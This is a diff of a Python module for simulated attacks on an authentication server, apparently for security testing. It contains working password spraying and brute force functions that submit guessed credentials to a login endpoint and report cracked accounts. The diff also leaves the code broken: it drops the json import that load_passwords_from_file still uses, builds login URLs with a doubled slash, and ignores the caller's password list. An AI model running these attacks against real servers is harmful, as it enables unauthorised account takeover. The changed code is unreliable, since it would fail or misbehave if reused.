@@ -5,8 +5,7 @@ Attack simulation methods for testing authentication server security.
 
 import os
 import sys
-from typing import List, Dict
-import json
+from typing import List
 import requests
 
 import attacks_const as const
@@ -14,40 +13,7 @@ import attacks_const as const
 # Add parent directory to path for server imports
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 
-from server.utils.config import load_config
-from server.utils import utils_const
-from server.server_const import CONFIG_PATH
 
-
-def load_server_config(config_path: str = None) -> Dict:
-    """
-    Load server configuration to get target URL and other settings.
-    
-    :param config_path: Optional path to config file
-    :return: Configuration dictionary
-    """
-    if config_path is None:
-        config_path = utils_const.CONFIG_PATH
-    
-    config = load_config(config_path)
-    return config
-
-
-def get_server_url_from_config(config: Dict) -> str:
-    """
-    Build server URL from configuration.
-    
-    :param config: Configuration dictionary
-    :return: Full server URL (e.g., "http://localhost:8000")
-    """
-    host = config[utils_const.SCHEME_KEY_HOST]
-    port = config[utils_const.SCHEME_KEY_PORT]
-    
-    # Convert 0.0.0.0 to localhost for client connections
-    if host == const.DEFAULT_SERVER_BIND_ADDRESS:
-        host = const.DEFAULT_LOCALHOST
-    
-    return f"http://{host}:{port}"
 
 def load_passwords_from_file(file_path: str = None) -> List[str]:
     """
@@ -56,6 +22,9 @@ def load_passwords_from_file(file_path: str = None) -> List[str]:
     :param file_path: Path to passwords JSON file (defaults to const.PASSWORDS_FILE_PATH)
     :return: List of passwords
     """
+    if file_path is None:
+        file_path = const.PASSWORDS_FILE_PATH
+
     with open(file_path, 'r', encoding='utf-8') as f:
         passwords = json.load(f)
         
@@ -66,7 +35,7 @@ def password_spraying(
     server_url: str,
     usernames: List[str],
     passwords: List[str] = None,
-    endpoint: str = "/login"
+    endpoint: str = "/login",
 ):
     """
     Simulate a password spraying attack.
@@ -79,13 +48,10 @@ def password_spraying(
     :param usernames: List of usernames to target
     :param passwords: List of passwords to try (defaults to COMMON_PASSWORDS)
     """
-    if passwords is None:
-        passwords = const.COMMON_PASSWORDS
-    
-    login_url = f"{server_url}{endpoint}"
+    passwords = load_passwords_from_file()
     
     print(f"[*] Starting password spraying attack")
-    print(f"[*] Target: {server_url}")
+    print(f"[*] Target: {server_url}/{endpoint}")
     print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
     print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
     
@@ -96,12 +62,12 @@ def password_spraying(
         for username in usernames:
             try:
                 response = requests.post(
-                    login_url,
+                    f"{server_url}/{endpoint}",
                     json={"username": username, "password": password},
                     timeout=const.DEFAULT_TIMEOUT
                 )
                 
-                if response.status_code == 200:
+                if response.status_code == const.SERVER_SUCCESS:
                     data = response.json()
                     if data.get("status") == "success":
                         print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
@@ -116,7 +82,8 @@ def brute_force_attack(
     server_url: str,
     target_username: str,
     password_list: List[str] = None,
-    max_attempts: int = None
+    max_attempts: int = None,
+    endpoint: str = "/login"
 ):
     """
     Simulate a brute force attack against a specific user.
@@ -131,9 +98,9 @@ def brute_force_attack(
     """
     if password_list is None:
         # Use common passwords plus some variations
-        password_list = const.COMMON_PASSWORDS + _generate_password_variations(target_username)
+        password_list = load_passwords_from_file() + _generate_password_variations(target_username)
     
-    login_url = f"{server_url}/login"
+    login_url = f"{server_url}/{endpoint}"
     
     print(f"[*] Starting brute force attack")
     print(f"[*] Target: {server_url}")
@@ -163,7 +130,7 @@ def brute_force_attack(
                 data = response.json()
                 if data.get("status") == "success":
                     print(f"\n[+] SUCCESS! Password found: '{password}'")
-                    print(f"[+] Cracked after {attempts} attempts")
+                    print(f"[+] Cracked {target_username} after {attempts} attempts")
                     return
                 
         except requests.exceptions.RequestException as e:
@@ -223,26 +190,3 @@ def _generate_password_variations(username: str = None) -> List[str]:
         variations.append(f"{username}123")
     
     return variations
-
-
-def dictionary_attack(
-    server_url: str,
-    target_username: str,
-    dictionary_file: str
-):
-    """
-    Simulate a dictionary attack using passwords from a file.
-    
-    :param server_url: Base URL of the authentication server
-    :param target_username: Username to target
-    :param dictionary_file: Path to file containing passwords (one per line)
-    """
-    try:
-        with open(dictionary_file, 'r', encoding='utf-8') as f:
-            password_list = [line.strip() for line in f if line.strip()]
-    except FileNotFoundError:
-        print(f"[!] Dictionary file not found: {dictionary_file}")
-        return
-    
-    print(f"[*] Loaded {len(password_list)} passwords from dictionary")
-    brute_force_attack(server_url, target_username, password_list)
